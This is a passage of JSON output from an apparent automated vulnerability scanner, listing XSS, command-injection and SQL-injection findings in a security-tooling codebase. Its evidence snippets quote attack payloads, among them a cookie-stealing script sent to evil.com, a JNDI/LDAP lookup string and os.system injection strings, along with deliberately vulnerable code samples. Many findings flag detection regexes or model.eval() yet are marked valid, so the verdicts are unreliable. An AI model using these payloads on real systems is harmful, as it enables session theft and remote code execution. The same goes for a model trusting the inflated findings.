          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in z3_verification_module.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),\n            (r'eval\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'eval() with variable'),\n        ]\n",
          "line_numbers": [
            295
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "\n        Checks for:\n        - system(), exec(), shell_exec() with user input\n        - os.system(), subprocess with shell=True\n        \"\"\"",
          "line_numbers": [
            278
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "\n        Checks for:\n        - system(), exec(), shell_exec() with user input\n        - os.system(), subprocess with shell=True\n        \"\"\"",
          "line_numbers": [
            278
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        Checks for:\n        - system(), exec(), shell_exec() with user input\n        - os.system(), subprocess with shell=True\n        \"\"\"\n        result = {",
          "line_numbers": [
            279
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-004",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        # Dangerous functions\n        dangerous_patterns = [\n            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'shell_exec\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'shell_exec() with variable'),",
          "line_numbers": [
            290
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-005",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        dangerous_patterns = [\n            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'shell_exec\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'shell_exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),",
          "line_numbers": [
            291
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-006",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            (r'system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'system() with variable'),\n            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'shell_exec\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'shell_exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),",
          "line_numbers": [
            292
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-007",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            (r'exec\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'exec() with variable'),\n            (r'shell_exec\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'shell_exec() with variable'),\n            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),\n            (r'eval\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'eval() with variable'),",
          "line_numbers": [
            293
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-008",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            (r'os\\.system\\s*\\([^)]*\\w+[^)]*\\)', 0.95, 'os.system() with variable'),\n            (r'subprocess.*shell\\s*=\\s*True', 0.85, 'subprocess with shell=True'),\n            (r'eval\\s*\\([^)]*\\w+[^)]*\\)', 0.90, 'eval() with variable'),\n        ]\n",
          "line_numbers": [
            295
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-009",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: os.system() with string concatenation",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        import os\n        def run_command(user_input):\n            os.system(\"echo \" + user_input)\n        \"\"\"\n",
          "line_numbers": [
            543
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-010",
        "title": "Command Injection in z3_verification_module.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        import os\n        def run_command(user_input):\n            os.system(\"echo \" + user_input)\n        \"\"\"\n",
          "line_numbers": [
            543
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in huntr_pattern_extractor.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: subprocess with shell=True",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/huntr_pattern_extractor.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "def command_injection(user_input):\n    # Command injection\n    subprocess.call(f\"ping {user_input}\", shell=True)\n\ndef sql_injection(username):",
          "line_numbers": [
            596
          ],
          "file_path": "core/huntr_pattern_extractor.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in http_security_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "                \"'; alert('XSS'); //\",\n                \"<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>\",\n                \"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\",\n\n                # Bypass Filters",
          "line_numbers": [
            92
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in http_security_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "                # Code Injection\n                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",\n                \"${jndi:ldap://evil.com/a}\",",
          "line_numbers": [
            144
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"'; alert('XSS'); //\",\n                \"<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>\",\n                \"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\",\n\n                # Bypass Filters",
          "line_numbers": [
            92
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "\n                # Code Injection\n                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",",
          "line_numbers": [
            143
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                # Code Injection\n                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",\n                \"${jndi:ldap://evil.com/a}\",",
          "line_numbers": [
            144
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-004",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                # Code Injection\n                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",\n                \"${jndi:ldap://evil.com/a}\",",
          "line_numbers": [
            144
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-005",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",\n                \"${jndi:ldap://evil.com/a}\",\n",
          "line_numbers": [
            145
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-006",
        "title": "Command Injection in http_security_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/http_security_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"__import__('os').system('id')\",\n                \"eval('__import__(\\\"os\\\").system(\\\"id\\\")')\",\n                \"exec('import os; os.system(\\\"id\\\")')\",\n                \"${jndi:ldap://evil.com/a}\",\n",
          "line_numbers": [
            145
          ],
          "file_path": "core/http_security_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in enhanced_gnn_trainer.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/enhanced_gnn_trainer.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        Validate model and return comprehensive metrics\n        \"\"\"\n        self.model.eval()\n        total_loss = 0.0\n        all_preds = []",
          "line_numbers": [
            221
          ],
          "file_path": "core/enhanced_gnn_trainer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in enhanced_gnn_trainer.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/enhanced_gnn_trainer.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        Validate model and return comprehensive metrics\n        \"\"\"\n        self.model.eval()\n        total_loss = 0.0\n        all_preds = []",
          "line_numbers": [
            221
          ],
          "file_path": "core/enhanced_gnn_trainer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in hackerone_dataset_builder.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "        return {\n            'vulnerable': [\n                \"query = 'SELECT * FROM users WHERE id = ' + user_id\",\n                \"cursor.execute('SELECT * FROM data WHERE name = \\\"%s\\\"' % name)\",\n                \"db.query(f'SELECT * FROM accounts WHERE user = {username}')\",",
          "line_numbers": [
            114
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-002",
        "title": "SQL Injection in hackerone_dataset_builder.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to f-string in database query",
